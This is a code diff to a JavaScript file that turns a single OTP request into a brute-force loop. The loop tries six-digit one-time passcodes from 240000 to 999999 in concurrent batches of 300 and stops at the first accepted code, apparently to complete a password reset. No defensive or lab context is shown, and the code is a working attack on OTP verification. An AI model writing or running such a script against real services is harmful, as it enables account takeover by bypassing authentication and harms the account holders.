@@ -34,8 +34,32 @@ function sendRequest(otp) {
             console.log(JSON.stringify(response.data));
         })
             .catch((error) => {
-            console.log(error);
+            // console.log(`Failed  ${otp}`);
         });
     });
 }
-sendRequest("639740");
+function main() {
+    return __awaiter(this, void 0, void 0, function* () {
+        let resetDone = false;
+        for (let i = 240000; i <= 999999; i += 300) {
+            console.log(i);
+            if (resetDone) {
+                break;
+            }
+            const p = [];
+            for (let j = 0; j < 300; j++) {
+                p.push(sendRequest((i + j).toString()));
+            }
+            const data = yield Promise.all(p);
+            data.forEach(element => {
+                if (element !== null && element !== undefined) {
+                    console.log(element);
+                    // process.exit(1);
+                    resetDone = true;
+                }
+            });
+            // console.log(p.length);
+        }
+    });
+}
+main();
